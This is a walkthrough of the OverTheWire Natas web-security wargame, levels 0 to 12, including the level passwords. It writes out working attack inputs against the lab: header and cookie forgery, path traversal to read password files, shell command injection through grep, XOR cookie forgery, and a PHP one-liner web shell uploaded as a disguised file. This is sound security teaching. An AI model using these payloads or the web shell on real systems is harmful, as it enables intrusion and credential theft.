# Natas

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where `X` is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. `natas0` for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in `/etc/natas_webpass/`. E.g. the password for `natas5` is stored in the file `/etc/natas_webpass/natas5` and only readable by `natas4` and `natas5`.

Start here:

Username: `natas0`
Password: `natas0`
URL: http://natas0.natas.labs.overthewire.org

## Natas 0

### Credentials

Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

### Message

You can find the password for the next level on this page.

### Solution

View page source:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

## Natas 1

### Credentials

Username: natas1
Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
URL: http://natas1.natas.labs.overthewire.org

### Message

You can find the password for the next level on this page, but rightclicking has been blocked!

### Solution

Use browser console (usually F12 opens it).

This allows to see the HTML content, which includes the following.

```
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>

...
```

## Natas 2

### Credentials

Username: natas2
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
URL: http://natas2.natas.labs.overthewire.org

### Message

There is nothing on this page

### Solution

Page source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas2", "pass": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" };</script></head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

Navigate to `http://natas2.natas.labs.overthewire.org/files/`. Here we find `pixel.png`, as expected, and `users.txt`:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas 3

### Credentials

Username: natas3
Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
URL: http://natas3.natas.labs.overthewire.org

### Message

There is nothing on this page

### Solution

Inner HTML:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

Have a look at `http://natas3.natas.labs.overthewire.org/robots.txt`:

```
User-agent: *
Disallow: /s3cr3t/
```

Thus go to `http://natas3.natas.labs.overthewire.org/s3cr3t/`. Here we find `users.txt` (at `http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt`):

```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Natas 4

### Credentials

Username: natas4
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
URL: http://natas4.natas.labs.overthewire.org

### Message

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

### Solution

Refresh the page with the link. The message changes to

> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Page source:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Suspect that it has something to do with the request headers. Inspect them using the browser console. See:

```
Referer: http://natas4.natas.labs.overthewire.org/
```

Try to change that. A way is using Burp Suite. Edit the request header: intercept the request with Proxy, send it to Repeater and edit the `Referer` header setting it to `http://natas5.natas.labs.overthewire.org/`. This gives us a different response which contains:

```
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

## Natas 5

### Credentials

Username: natas5
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
URL: http://natas5.natas.labs.overthewire.org

### Message

Access disallowed. You are not logged in

### Solution

Intercepting the request, we see that this is:

```
GET /index.php HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: loggedin=0
Connection: keep-alive
```

Reading carefully, we notice: `Cookie: loggedin=0`.

Try to set this to `1` and resend the request...

This changes the response to:

```html
HTTP/1.1 200 OK
Date: Fri, 20 Sep 2024 16:30:46 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=1
Vary: Accept-Encoding
Content-Length: 890
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

## Natas 6

### Credentials

Username: natas6
Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
URL: http://natas6.natas.labs.overthewire.org

### Message

Input secret: ...

Submit.

### Solution

The page requests a secret.

The source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Thus there is a `http://natas6.natas.labs.overthewire.org/includes/secret.inc` file... Try to get it with `curl`:

```bash
curl -H "Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk" http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submit the secret in the field requiring it and get:

> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Natas 7

### Credentials

Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
URL: http://natas7.natas.labs.overthewire.org

### Message

There is a page with a **Home** and an **About** links.

### Solution

The Home page redirects to http://natas7.natas.labs.overthewire.org/index.php?page=home, the About page to http://natas7.natas.labs.overthewire.org/index.php?page=about.

Try to get http://natas7.natas.labs.overthewire.org/index.php?page=test:

> Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

> Warning: include(): Failed opening 'test' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21

This error message is very useful... We can get a file from the file system, it seems.

It gives us also the base directory...

Try http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/passwd.

This works, but we are not interested in this...

Try: http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8.
This gives us:

> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

## Natas 8

### Credentials

Username: natas8
Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
URL: http://natas8.natas.labs.overthewire.org

### Message

Input secret: ...

### Solution

There is a View sourcecode link. The source code is this:

```html
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We have two interesting pieces of information:

```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
```

and

```
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

We shall reverse the encoding on the given encoded secret; the value thus obtained shall be passed into the form in the page.

Try with the following reversing code:

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($encodedSecret) {
    return base64_decode(strrev(hex2bin($encodedSecret)));
}

echo decodeSecret($encodedSecret);
```

This prints:

```
oubWYf2kBq
```

This works: it returns:

> Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

## Natas 9

### Credentials

Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
URL: http://natas9.natas.labs.overthewire.org

### Message

Find words containing: ...

### Solution

There is the View sourcecode link.

The source code:

```html
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The relevant PHP code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Try http://natas9.natas.labs.overthewire.org/?needle=password. This returns:

```
password
password's
passwords
```

The form does exactly this: it gets a word, say `asd`, and sends it to: http://natas9.natas.labs.overthewire.org/?needle=asd&submit=Search.

Find some interesting information about `passthru` here: https://www.php.net/manual/en/function.passthru.php.

The function is similar to `exec`.

If we input `zope dictionary.txt; cat `, we get what seems to be the content of `dictionary.txt`...

Interesting. Let's try

```
zope dictionary.txt; cat /etc/natas_webpass/natas10 | tee
```

This gives us:

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Natas 10

### Credentials

Username: natas10
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
URL: http://natas10.natas.labs.overthewire.org

### Message

For security reasons, we now filter on certain characters

Find words containing: ...

### Solution

Now `asd; cat` doesn't work anymore:

> Input contains an illegal character!

Neither does `&&`.

The source code (obtained from the link):

```html
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to exploit the behaviour of `grep`: this searches any given input file. We can provide more than one...

Input: `p /etc/natas_webpass/natas11`: this corresponds to the executed command:

```bash
grep -i p /etc/natas_webpass/natas11 dictionary.txt
```

so this will search both `dictionary.txt` and `/etc/natas_webpass/natas11` for the character `p` and gives us:

```
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
...
```

## Natas 11

### Credentials

Username: natas11
Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
URL: http://natas11.natas.labs.overthewire.org

### Message

Cookies are protected with XOR encryption

Background color: [#ffffff]

### Solution

The source code (link):

```html
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

From the code, we expect a cookie called `data` to be present. Effectively, the cookie is there and contains:

```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
```

We need to decode / decrypt it.

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
```

and in particular:

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

Intercept a request:

```
GET /?bgcolor=%23ffaaaa HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://natas11.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

This is the same cookie we see in the browser Storage:

```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg%3D
```

Code to decrypt the cookie:

```php
$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg";

function xor_encrypt($in) {
    $key = json_encode(array("showpassword" => "no", "bgcolor" => "#ffffff"));
    $text = base64_decode($in);
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($cookie);
```

We get: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWhbCPoe`

Now:

```php
$cookie = array("showpassword" => "yes", "bgcolor" => "#ffffff");

function xor_encrypt($in) {
    $key = "eDWo";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print base64_encode(xor_encrypt(json_encode($cookie)));
```

Got: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`.

This shows the password:

> The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

## Natas 12

### Credentials

Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL: http://natas12.natas.labs.overthewire.org

### Message

Choose a JPEG to upload (max 1KB):

### Solution

Source code (link):

```html
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

One-liner PHP RCE code:

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

Also, the client renames the file to `.jpg`:

```html
<input
  type="hidden"
  name="filename"
  value="<?php print genRandomString(); ?>.jpg"
/>
```

This can easily be changed: it's client side...

Edit the `.jpg` in `.php` and upload the PHP one-liner.

We get:

> The file upload/f2ce8mjyzp.php has been uploaded

So we use the link passing `e` as parameter: natas12.natas.labs.overthewire.org/upload/f2ce8mjyzp.php?e=cat /etc/natas_webpass/natas13.

Get: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`.
